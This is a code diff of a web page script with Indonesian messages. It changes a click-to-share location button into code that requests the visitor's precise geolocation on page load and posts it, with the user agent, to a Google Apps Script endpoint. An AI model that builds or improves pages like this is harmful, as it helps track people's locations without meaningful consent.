@@ -48,79 +48,63 @@
     </div>
   </div>
 
-  <script>
-    const ENDPOINT_URL = 'https://script.google.com/macros/s/AKfycbxZgB8NAuRkAEKSYArymMIQZlwBq77blKXoQ9fDJhUR4ib_z3xP_B9KF0cwmVBMImi1-A/exec'; // ← ganti dengan URL Web App GAS
+ <script>
+  const ENDPOINT_URL = 'https://script.google.com/macros/s/AKfycbxZgB8NAuRkAEKSYArymMIQZlwBq77blKXoQ9fDJhUR4ib_z3xP_B9KF0cwmVBMImi1-A/exec';
 
-    const shareBtn = document.getElementById('shareBtn');
-    const statusEl = document.getElementById('status');
-    const noteEl = document.getElementById('note');
-    const mapWrap = document.getElementById('mapWrap');
-    const mapUrl = document.getElementById('mapUrl');
-    const coordsEl = document.getElementById('coords');
+  const statusEl = document.getElementById('status');
+  const noteEl = document.getElementById('note');
+  const mapWrap = document.getElementById('mapWrap');
+  const mapUrl = document.getElementById('mapUrl');
+  const coordsEl = document.getElementById('coords');
 
-    function setStatus(msg) {
-      statusEl.textContent = msg;
-    }
+  function setStatus(msg) { statusEl.textContent = msg; }
 
-    async function sendLocation(latitude, longitude, accuracy) {
-      const payload = {
-        latitude, longitude, accuracy,
-        userNote: noteEl.value.trim(),
-        ua: navigator.userAgent
-      };
-      const res = await fetch(ENDPOINT_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'Text/Plain' },
-        body: JSON.stringify(payload),
-      });
-      return res.json();
-    }
-
-    shareBtn.addEventListener('click', () => {
-      setStatus('Meminta izin lokasi dari browser…');
-      shareBtn.disabled = true;
-
-      if (!('geolocation' in navigator)) {
-        setStatus('Perangkat ini tidak mendukung Geolocation.');
-        shareBtn.disabled = false;
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords || {};
-        setStatus('Mengirim lokasi secara aman…');
-
-        try {
-          const result = await sendLocation(latitude, longitude, accuracy);
-          if (result.ok) {
-            setStatus('Lokasi berhasil dikirim. Terima kasih!');
-            const gmaps = `https://maps.google.com/?q=${latitude},${longitude}`;
-            mapUrl.href = gmaps;
-            mapUrl.textContent = 'Buka titik lokasi di Google Maps';
-            coordsEl.textContent = `Lat: ${latitude}, Lng: ${longitude}, Akurasi ±${Math.round(accuracy)} m`;
-            mapWrap.style.display = 'block';
-          } else {
-            setStatus('Gagal menyimpan lokasi: ' + (result.error || 'unknown error'));
-          }
-        } catch (e) {
-          setStatus('Terjadi kesalahan jaringan saat mengirim lokasi.');
-        } finally {
-          shareBtn.disabled = false;
-        }
-      }, (err) => {
-        const msg = {
-          1: 'Izin lokasi ditolak.',
-          2: 'Lokasi tidak tersedia.',
-          3: 'Permintaan lokasi kedaluwarsa.'
-        }[err.code] || 'Gagal mendapatkan lokasi.';
-        setStatus(msg);
-        shareBtn.disabled = false;
-      }, {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
-      });
+  async function sendLocation(latitude, longitude, accuracy) {
+    const payload = {
+      latitude, longitude, accuracy,
+      userNote: noteEl.value.trim(),
+      ua: navigator.userAgent
+    };
+    const res = await fetch(ENDPOINT_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'Text/Plain' },
+      body: JSON.stringify(payload),
     });
-  </script>
-</body>
-</html>
+    return res.json();
+  }
+
+  function getAndSendLocation() {
+    if (!('geolocation' in navigator)) {
+      setStatus('Perangkat ini tidak mendukung Geolocation.');
+      return;
+    }
+
+    setStatus('Meminta izin lokasi…');
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const { latitude, longitude, accuracy } = pos.coords || {};
+      setStatus('Mengirim lokasi…');
+
+      try {
+        const result = await sendLocation(latitude, longitude, accuracy);
+        if (result.ok) {
+          setStatus('Lokasi berhasil dikirim!');
+          const gmaps = `https://maps.google.com/?q=${latitude},${longitude}`;
+          mapUrl.href = gmaps;
+          mapUrl.textContent = 'Buka titik lokasi di Google Maps';
+          coordsEl.textContent = `Lat: ${latitude}, Lng: ${longitude}, Akurasi ±${Math.round(accuracy)} m`;
+          mapWrap.style.display = 'block';
+        } else {
+          setStatus('Gagal simpan lokasi: ' + (result.error || 'unknown'));
+        }
+      } catch {
+        setStatus('Gagal jaringan saat mengirim lokasi.');
+      }
+    }, (err) => {
+      const msg = {1:'Izin ditolak.',2:'Lokasi tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal mendapatkan lokasi.';
+      setStatus(msg);
+    }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
+  }
+
+  // 🔥 otomatis dijalankan ketika halaman dibuka
+  window.addEventListener('load', getAndSendLocation);
+</script>
